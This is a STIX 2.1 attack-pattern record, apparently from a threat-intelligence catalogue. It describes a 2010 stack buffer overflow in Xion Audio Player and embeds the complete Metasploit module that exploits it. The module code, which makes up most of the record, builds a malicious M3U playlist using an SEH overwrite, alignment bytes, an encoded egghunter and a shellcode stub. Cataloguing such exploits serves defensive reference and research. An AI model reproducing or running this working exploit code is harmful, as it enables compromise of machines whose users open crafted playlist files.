{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bfcf9eb2-0420-42ed-9ead-69c749c516ab",
    "created": "2024-08-14T16:37:11.265199Z",
    "modified": "2024-08-14T16:37:11.265203Z",
    "name": "Xion Audio Player 1.0.126 Unicode Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Xion Audio Player prior to version 1.0.126. The vulnerability is triggered when opening a malformed M3U file that contains an overly long string. This results in overwriting a structured exception handler record.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/xion_m3u_sehbof.rb",
            "external_id": "xion_m3u_sehbof.rb"
        },
        {
            "source_name": "#CVE",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n  #include Msf::Exploit::Seh # unused due to special circumstances\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Xion Audio Player 1.0.126 Unicode Stack Buffer Overflow',\n      'Description' \t=> %q{\n          This module exploits a stack buffer overflow in Xion Audio Player prior to version\n        1.0.126. The vulnerability is triggered when opening a malformed M3U file that\n        contains an overly long string. This results in overwriting a\n        structured exception handler record.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=>\n        [\n          'hadji samir <s-dz[at]hotmail.fr>',    # Discovered the bug\n          'corelanc0d3r <peter.ve[at]corelan.be>', # First working exploit\n          'digital1',         # First working exploit\n          'jduck',            # Alpha+Unicode encoding :-/\n          'm_101'             # Original and msf exploit\n        ],\n      'References'     =>\n        [\n          #[ 'CVE', '' ],\n          [ 'OSVDB', '66912'],\n          [ 'EDB', '14517' ],\n          [ 'EDB', '14633' ],\n          [ 'EDB', '15598' ]\n        ],\n      'Payload'\t=>\n        {\n          'BadChars'\t=>  \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0d\\x2F\\x5c\\x3c\\x3e\\x5e\\x7e\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EDI',  # egghunter jmp edi\n            }\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          [ 'Xion Audio Player v1.0.126 XP Universal', { 'Offset' => 252, 'Ret' => \"\\x51\\x43\" } ]  #unicode p/p/r equivalent xion.exe\n        ],\n      'DisclosureDate' => '2010-11-23',\n      'DefaultTarget'\t=> 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The output filename.', 'm_101_xion.m3u']),\n        # seh offset depends on path length\n        OptString.new('TARGETPATH', [ false, 'The target output.', 'C:\\\\'])\n      ])\n  end\n\n  def exploit\n    # seh chain\n    # 5b            pop ebx\n    # 00 43 00      add byte [ebx], al\n    nseh = \"\\x5b\\x43\"\n    # 51            push ecx\n    # 00 43 00      add byte [ebx], al\n    seh = target['Ret']\n\n    # 37            aaa                     ; clear al bit 4 to 7\n    # 00 38         add byte [eax], bh      ; eax = 0x00390001 (rw)\n    # 00 41 00      add byte [ecx], al      ; ecx = 0x00380037 (rw)\n    # 39 00         cmp dword [eax], eax\n    ecx = \"\\x37\\x38\"\n    eax = \"\\x41\\x39\"\n\n    # alignment code\n    # 5a            pop edx\n    # 00 43 00      add byte [ebx], al\n    align = \"\\x5a\\x43\" * 2\n    # 5c            pop esp\n    # 00 43 00      add byte [ebx], al\n    align += \"\\x5c\\x43\"\n    # 61            popad\n    # 00 41 00      add byte [ecx], al\n    align += \"\\x61\\x41\"\n    # junk code just for alignment\n    # 37            aaa                     ; clear al bit 4 to 7\n    # 00 38         add byte [eax], bh      ; eax = 0x00390001 (rw)\n    # 00 41 00      add byte [ecx], al      ; ecx = 0x00380037 (rw)\n    # 39 00         cmp dword [eax], eax\n    align << ecx\n    align << eax\n\n    hunter, egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    # Encode with alphamixed, then unicode mixed\n    # thanks to jduck for this egghunter code snippet\n    [ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~ /unicode/\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })\n      else\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })\n      end\n      # NOTE: we already eliminated badchars\n      hunter = enc.encode(hunter, nil, nil, platform)\n      if name =~/alpha/\n        #insert getpc_stub & align EDX, unicode encoder friendly.\n        #Hardcoded stub is not an issue here because it gets encoded anyway\n        getpc_stub = \"\\x89\\xe1\\xdb\\xcc\\xd9\\x71\\xf4\\x5a\\x83\\xc2\\x41\\x83\\xea\\x35\"\n        hunter = getpc_stub + hunter\n      end\n    }\n    #tweak hunter, patched to make it write to ECX\n    hunter[1] = \"a\"\n\n    # care must be taken : depends on PATHLEN\n    seh_offset = 266 - datastore['TARGETPATH'].length\n    sploit = rand_text_alphanumeric(seh_offset)\n    # seh chain\n    sploit << nseh << seh\n    sploit << align\n    sploit << hunter\n    sploit << egg\n    # if not long enough, it won't trigger the seh\n    sploit << rand_text_alphanumeric(4000 - sploit.length)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-23",
    "x_mitre_platforms": [
        "win'"
    ]
}